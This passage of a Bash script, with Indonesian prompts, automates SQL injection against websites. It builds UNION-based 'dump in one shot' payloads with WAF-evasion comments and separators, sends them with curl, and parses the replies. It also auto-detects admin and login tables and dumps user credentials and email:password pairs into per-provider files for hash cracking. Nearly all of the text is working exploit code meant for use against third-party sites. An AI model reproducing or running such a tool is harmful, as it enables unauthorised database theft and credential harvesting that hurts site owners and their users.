             echo -e "\033[1;35m Found login aksess table${N}"
             echo -en "${N}+$coiadm+\n${G}"
             cat .table | sort -u | uniq -i | grep -aP "admin|login|user|pengguna|kode|pass"
             echo -en "${N}+$coi+\n"
             echo "$site" >> $admin_site
          fi
          ok=0
          trap break INT
          if [[ "$boot_empas" = "y" ]];then
          	         for table in $(cat .table | sort -u | uniq -i | grep -aP "$auto_get" | cut -d ":" -f1 | uniq -i)
          	         do
                          colon=$(cat .table | sort -u | uniq -i | grep -aP "$table" | cut -d ":" -f3 | grep -aP "$auto_get" | uniq -i | sed '/^[[:blank:]]*$/d' | sed ':a;N;$!ba;s/\n/,0x3a3a,/g')
                          echo -e "${G}\033[2mDump table name ${N}: $table\n${G}\033[2mDump colom name ${N}: $colon" | sed "s/,0x3a3a,/,/g"
                          if [[ "$dump_sqli" = "y" ]];then
                             Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                             Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon},0x3c6c693e)+FROM+$db_na.$table)"
                             Dump2="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                             Dump3="(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon},0x3c6c693e)+/*!50000FROM*/+$db_na.$table)"
                             Dump4="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($db_na.$table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             if [[ "$waff" = "on" ]];then
                             if [[ "$by" = "$w3" ]];then
                                Dump1="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($db_na.$table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             else
                                Dump99="(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($db_na.$table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                                Dump9="(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+$db_na.$table)"
                             fi
                           fi
                          else
                             Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon}))))x)"
                             Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon})+FROM+${table})"
                             Dump2="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             Dump3="(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon})+/*!50000FROM*/+${table})"
                             Dump4="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             if [[ "$waff" = "on" ]];then
                             if [[ "$by" = "$w3" ]];then
                                Dump1="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             else
                                Dump99="(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                                Dump9="(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+${table})"
                             fi
                           fi
                          fi
                          trap break INT
                          trap break SIGTRAP
                          for ump in $Dump $Dump1 $Dump2 $Dump3 $Dump4 $Dump9 $Dump99 r
                          do
                            if echo "$dk" | grep -aP "database|Database" >/dev/null
                            then
                               ump=$(echo "$ump" | sed "s/$db_na.//g")
                            fi
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2m${BL}pastikan input yg dimasukan sudah benar atau periksa koneksi\njika input sudah benar kemungkinan colomn yg di tuju kosong${N}"
                               break
                            fi
                            if [[ "$based64" = "y" ]]
                            then
                               if [[ "$corona" = "y" ]];then
                                  s=$(sed "s|${in}|$ump|g" <<< $i2 | sed "s/,,/,/g")
                               else
                                  if [[ "$in" = "$i" ]];then
                                     s=$(sed "s|,${in}|,$ump|g" <<< $i2 | sed "s/,,/,/g")
                                  else
                                     s=$(sed "s|,${in},|,$ump,|g" <<< $i2 | sed "s/,,/,/g")
                                  fi
                               fi
                               bs77=$(echo "null$union$s"  | tr -d "+" | base64 -i)
                               base90=$(echo "$st$bs77" | tr -d "\n")
                               echo -e "${N}${O}Query :${N}\033[2m $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                               echo -e "DUMP :: $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                               cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base90" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                            else
                               if [[ "$corona" = "y" ]];then
                                  ii=$(sed "s|${in}|$ump|g" <<< $i2 | sed "s/,,/,/g")
                               else
                                  if [[ "$in" = "$i" ]];then
                                     ii=$(sed "s|,${in}|,$ump|g" <<< $i2 | sed "s/,,/,/g")
                                  else
                                     ii=$(sed "s|,${in},|,$ump,|g" <<< $i2 | sed "s/,,/,/g")
                                  fi
                               fi
                               if [[ "$html" = "y" ]]
                               then
                                  s=$(echo -e "$param1$union$ii$param2")
                               else
                                  if [[ "$postd" = "y" ]]
                                  then
                                    s=$(echo -e "$union$ii")
                                  else
                                    s=$(echo -e "$site$union$ii")
                                  fi
                               fi
                               echo -e "${N}${O}Query :${N}\033[2m $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                               echo -e "DUMP :: $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                               if [[ "$postd" = "y" ]]
                               then
                                  cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sLX POST "$site" --data "$postnya=null$s" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                               else
                                  cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$s" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                               fi
                            fi
                            if echo "$cury" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
                               echo -e "${O}\033[2mWAFF Blocked: ${R}`echo "$cury" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
                               continue
                            fi
                            if echo "$cury" | grep "[[:alnum:]]" >/dev/null
                            then
                               echo -e "$cury" >> output/$dir/dump-$table.txt
                               echo -e "${N}Total Dumped :$G `wc -l output/$dir/dump-$table.txt`$N"
                               c=$(cat output/$dir/dump-$table.txt | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
                               coi=$(seq -s '-' $c | sed 's/[0-9]//g')
                               echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
                               echo -e "+$coi+\n $colon \n+$coi+$O" | sed 's/,0x3a3a,/ :: /g'
                               echo -e "$O$cury" | sort -u | uniq -i
                               echo -en "${N}+$coi+\n"
                               if cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null
                               then
                                  echo -e "${O}Dump Email Found Auto filter$N"
                                  echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`${N}"
                                  for maile in gmail yahoo aol hotmail
                                  do
                                    cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $maile >> $maile.txt
                                    files=$(echo "$cury" | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $maile)
                                    if [[ -z "$files" ]];then
                                       echo -e "${N}[${G}+${N}] Result: ${G}`wc -l $maile.txt`${N}"
                                    else
                                	   list="$maile.txt"
                                	   hashdump
                                	   echo -e "${N}[${G}+${N}] Result: ${G}`wc -l $maile.txt`${N}"
                                    fi
                                  done
                                  cat output/$dir/dump-$table.txt | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
                                  files=$(echo "$cury" | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail)
                                  if [[ -z "$files" ]];then
                                    echo -e "${N}[${G}+${N}] others : ${G}`wc -l others.txt`${N}"
                                  else
                                	list="others.txt"
                                	hashdump
                                    echo -e "${N}[${G}+${N}] others : ${G}`wc -l others.txt`${N}"
                                  fi
                               else
                                  echo -e "${O}Dump Email Found Auto filter$N"
                                  echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`${N}"
                                  for maile in gmail yahoo aol hotmail
                                  do
                                    cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $maile >> $maile.txt
                                    echo -e "${N}[${G}+${N}] Result: ${G}`wc -l $maile.txt`${N}"
                                  done
                                  cat output/$dir/dump-$table.txt | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
                                  echo -e "${N}[${G}+${N}] others : ${G}`wc -l others.txt`${N}"
                               fi
                                  break
                       else
                            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"
                       fi
                       done
                       trap break 4 INT
                   done
  else
          for kont in y
          do
          while [ $ok = 0 ]
           do
            echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d untuk skip${N}"
            echo -en "${N}Dump Table name  : ${O}"
            read table2
            if [[ "$corect" = "y" ]];then
                table=$(cat .table 2>/dev/null | cut -d ":" -f1 | grep -nH -m 1 "$table2" | head -1 | cut -d ":" -f3)
            else
                table="$table2"
            fi
            if [ ${#table} -gt 1 ]
             then
               while [ $ok = 0 ]
                do
                 echo -ne "${N}Dump Column name :${O} "
                 read co
                 if [ ${#co} -gt 1 ]
                 then
                    echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                    cor=$(echo $co | sed 's/,/|/g')
                    if cat .table | grep -Po "$table" >/dev/null
                    then
                       if cat .table | grep -Po "$cor" >/dev/null
                       then
                          colon=$(echo $co | sed 's/,/,0x3a3a,/g')
                          if [[ "$dump_sqli" = "y" ]];then
                             Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                             Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon},0x3c6c693e)+FROM+$db_na.$table)"
                             Dump2="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($db_na.$table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon},0x3c6c693e))))x)"
                             Dump3="(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon},0x3c6c693e)+/*!50000FROM*/+$db_na.$table)"
                             Dump4="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($db_na.$table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             if [[ "$waff" = "on" ]];then
                             if [[ "$by" = "$w3" ]];then
                                Dump1="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($db_na.$table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             else
                                Dump99="(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($db_na.$table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                                Dump9="(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+$db_na.$table)"
                             fi
                           fi
                          else
                             Dump="(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,${colon}))))x)"
                             Dump1="(SELECT+GROUP_CONCAT(0x3c6c693e,${colon})+FROM+${table})"
                             Dump2="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             Dump3="(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,${colon})+/*!50000FROM*/+${table})"
                             Dump4="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             if [[ "$waff" = "on" ]];then
                             if [[ "$by" = "$w3" ]];then
                                Dump1="(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)/*!50000FROM*/($table)WHERE(@x)IN(@x:=CONCAT/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                             else
                                Dump99="(SELECT(@x)${by}FROM${by}(SELECT${by}(@x:=0x00),(SELECT(@x)${by}FROM${by}($table)WHERE(@x)IN(@x:=CONCAT${by}/**8**/(0x20,@x,0x3c6c693e,${colon}))))x)"
                                Dump9="(SELECT+GROUP_CONCAT${by}/**8**/(0x3c6c693e,${colon})+${by}FROM${by}+${table})"
                             fi
                           fi
                          fi
                          trap break INT
                          for ump in $Dump $Dump1 $Dump2 $Dump3 $Dump4 $Dump9 $Dump99 r
                          do
                            if echo "$dk" | grep -aP "database|Database" >/dev/null
                            then
                               ump=$(echo "$ump" | sed "s/$db_na.//g")
                            fi
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2mpastikan input yg dimasukan sudah benar atau periksa koneksi\njika input sudah benar kemungkinan colomn yg di tuju kosong${N}"
                               echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                               if [[ "$masn" = "y" ]];then
                               echo -en "\n${G}\033[2mpress ctrl/vol + D skip to next site${N}"
                               fi
                               echo -en "\n\033[2mmysql@$dbdir/$db_na/ ?? ${G}"
                               read asks
                               case $asks in
                               1) dump
                               ;;
                               2) dump_name="y"
                                  info
                               ;;
                               3) menu
                                  break
                               ;;
                               *) echo -en "\n${O}skip to next site${N}";;
                               esac
                               trap - INT
                               break 4
                            fi
                            if [[ "$based64" = "y" ]]
                            then
                               if [[ "$corona" = "y" ]];then
                                  s=$(sed "s|${in}|$ump|g" <<< $i2 | sed "s/,,/,/g")
                               else
                                  if [[ "$in" = "$i" ]];then
                                     s=$(sed "s|,${in}|,$ump|g" <<< $i2 | sed "s/,,/,/g")
                                  else
                                     s=$(sed "s|,${in},|,$ump,|g" <<< $i2 | sed "s/,,/,/g")
                                  fi
                               fi
                               bs77=$(echo "null$union$s"  | tr -d "+" | base64 -i)
                               base90=$(echo "$st$bs77" | tr -d "\n")
                               echo -e "${N}${O}Query :${N}\033[2m $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                               echo -e "DUMP :: $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                               cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$base90" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                            else
                               if [[ "$corona" = "y" ]];then
                                  ii=$(sed "s|${in}|$ump|g" <<< $i2 | sed "s/,,/,/g")
                               else
                                  if [[ "$in" = "$i" ]];then
                                     ii=$(sed "s|,${in}|,$ump|g" <<< $i2 | sed "s/,,/,/g")
                                  else
                                     ii=$(sed "s|,${in},|,$ump,|g" <<< $i2 | sed "s/,,/,/g")
                                  fi
                               fi
                               if [[ "$html" = "y" ]]
                               then
                                  s=$(echo -e "$param1$union$ii$param2")
                               else
                                  if [[ "$postd" = "y" ]]
                                  then
                                    s=$(echo -e "$union$ii")
                                  else
                                    s=$(echo -e "$site$union$ii")
                                  fi
                               fi
                               echo -e "${N}${O}Query :${N}\033[2m $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                               echo -e "DUMP :: $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                               if [[ "$postd" = "y" ]]
                               then
                                  cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sLX POST "$site" --data "$postnya=null$s" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                               else
                                  cury=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$s" | grep -a -Po "(?<=<li>)[^<]*(.*?<)|(?<=<li>)[\.\:\_\@\[:alnum:]*::\$\@\.\:\_\[:alnum:]*]*<|(?<=<li>)[[:alnum:]*::\$\.\:\_\[:alnum:]*]*<|<li>[^:]*::[\$_/-/./[:alnum:]]*<li>|<li>[^:]*::[\$/_/-/./[:alnum:]]*<|<li>[^:]*::[\$/_/-/./[:alnum:]]*|<li>[^<]*<li>|<li>[^<]*<|[<li>_/-/./[:alnum:]]*::[\$/_/-/./[:alnum:]]*<|(?<=&lt;li&gt;)[^&]*|Forbidden|forbidden|Not Acceptable|Internal Server Error" | sed 's/<li>//g' | sed ':a;N;$!ba;s/\n::[[:alnum:]]*/</g' | tr -d "<" | sed '/^$/d' | cut -d '>' -f2 | tr -d '\0' | sed 's/\r$//')
                               fi
                            fi
                            if echo "$cury" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
                               echo -e "${O}\033[2mWAFF Blocked: ${R}`echo "$cury" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" | head -1`${N}"
                               continue
                            fi
                            if echo "$cury" | grep "[[:alnum:]]" >/dev/null
                            then
                               echo -e "$cury" >> output/$dir/dump-$table.txt
                               if echo "$cury" | grep -ao '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null
                               then
                                  echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
                                  echo -e "+$coi+\n $co \n+$coi+$O" | sed 's/,/ :: /g'
                                  echo -e "$O$cury" | sort -u | uniq -i
                                  echo -en "${N}+$coi+\n"
                                  echo -e "${O}Dump Email Found Auto filter$N"
                                  echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`${N}"
                                  for maile in gmail yahoo aol hotmail
                                  do
                                    cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $maile >> $maile.txt
                                    echo -e "${N}[${G}+${N}] Result: ${G}`wc -l $maile.txt`${N}"
                                  done
                                  cat output/$dir/dump-$table.txt | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
                                  echo -e "${N}[${G}+${N}] others : ${G}`wc -l others.txt`${N}"
                                  echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                               if [[ "$masn" = "y" ]];then
                                  echo -e "\n${G}\033[2mpress ctrl/vol + D skip to next site${N}"
                                  echo -en "\033[2mmysql@$dbdir/$db_na/ ?? ${G}"
                                  read asks
                                  case $asks in
                                  1) dump
                                  ;;
                                  2) dump_name="y"
                                     info
                                  ;;
                                  3) menu
                                  ;;
                                  *) echo -en "\n${O}skip to next site${N}";;
                                  esac
                                  trap - INT
                                  break 4
                               fi
                               echo -en "\n\033[2mmysql@$dbdir/$db_na/ ?? ${G}"
                               read asks
                               case $asks in
                               1) dump
                               ;;
                               2) dump_name="y"
                                  info
                               ;;
                               3) menu
                               ;;
                               *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
                               esac
                            else
                               echo -e "${N}Total Dumped :$G `wc -l output/$dir/dump-$table.txt`$N"
                               c=$(cat output/$dir/dump-$table.txt | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
                               coi=$(seq -s '-' $c | sed 's/[0-9]//g')
                               echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
                               echo -e "+$coi+\n $co \n+$coi+$O" | sed 's/,/ :: /g'
                               echo -e "$O$cury" | sort -u | uniq -i
                               echo -en "${N}+$coi+\n"
                               echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                               if [[ "$masn" = "y" ]];then
                                  echo -e "\n${G}\033[2mpress ctrl/vol + D skip to next site${N}"
                                  echo -en "\033[2mmysql@$dbdir/$db_na/ ?? ${G}"
                                  read asks
                                  case $asks in
                                  1) dump
                                  ;;
                                  2) dump_name="y"
                                     info
                                  ;;
                                  3) menu
                                  ;;
                                  *) echo -en "\n${O}skip to next site${N}";;
                                  esac
                                  trap - INT
                                  break 4
                               fi
                               echo -en "\n\033[2mmysql@$dbdir/$db_na/ ?? ${G}"
                               read asks
                               case $asks in
                               1) dump
                               ;;
                               2) dump_name="y"
                                  info
                               ;;
                               3) menu
                               ;;
                               *) echo -e "${N}[${G}+${N}] Thx for using this tools";;
                               esac
                           fi
                           break 4
                       else
                            echo -e "${R}${N}[${R}INFO${N}] ${R}FAILED mencoba dengan dios lain${N}"
                       fi
                       done
                       trap break 4 INT
                   else
                       echo -e "${R}worng input$N"
                       dump
                       break 2
                   fi
               else
                   echo -e "${R}worng input$N"
                   dump
                   break 2
               fi
            else
               echo -e "${R}worng input$N"
               dump
               break 2
            fi
            done
            trap break 4 INT
        else
           echo -e "${R}worng input$N"
           dump
           break 2
        fi
        done
      done
  fi
  done
        trap break 4 INT
}

email() {
  line=$(echo "$line" | sed "s/-- -/--+/g")
  echo "$line";curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s -L "$line" > tmp;grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' "tmp" | sort | uniq -i > list;echo "";echo "Total Dumped : `wc -l list`";for mail in gmail yahoo aol hotmail;do cat list | grep $mail >> $mail.txt;echo "[+] `wc -l $mail.txt`";done;cat list | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt;echo "[+] others : `wc -l others.txt`";rm tmp
}

sqli() {
  corona="n"
  if [[ "$waff" = "on" ]];then
    union="$union"
  else
    #union="/**8**/and/**8**/0+/**8**/UniOn/**8**/sEleCT/**8**/"
    echo -e "${N}[${G}*${N}]\033[2m Starting inject $site${N}"
  fi
  site=$(echo "$site" | sed "s/'//g" | sed "s/%27//g") #sed 's!http[s]*://!!g'
  dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${N}${dir}$N conection checking"
  if echo "$site" | awk -F "/" '{print $(NF)}' | cut -d "." -f2 | grep -Po "html" >/dev/null
  then
    echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}Html injection${N}"
    html="y"
  fi
  echo -ne "\x1b[0m${N}[${BL}`date +%T`${N}] mencoba cek vuln dengan koma "
  if [[ "$html" = "y" ]]
    then
    m11=$(echo $site | awk -F "/" '{print $(NF)}' | grep -o "[0-9]*" | head -1)
           if [[ "$m11" = "" ]]
            then
              m21=$(echo "$site" | awk -F "/" '{print $(NF)}' | grep -Po ".html" | tail -1)
              param1=$(echo "$site" | sed "s/$m21/'$m21/g") #parameter angka
              param11=$(echo "$param1" | cut -d "'" -f1)
              param21=$(echo "$param1" | cut -d "'" -f2)
            else
              param1=$(echo "$site" | sed "s/$m11/$m11'/g") #tidak ada angka
              param11=$(echo "$param1" | cut -d "'" -f1)
              param21=$(echo "$param1" | cut -d "'" -f2)
            fi
             curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$param11$param21" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site
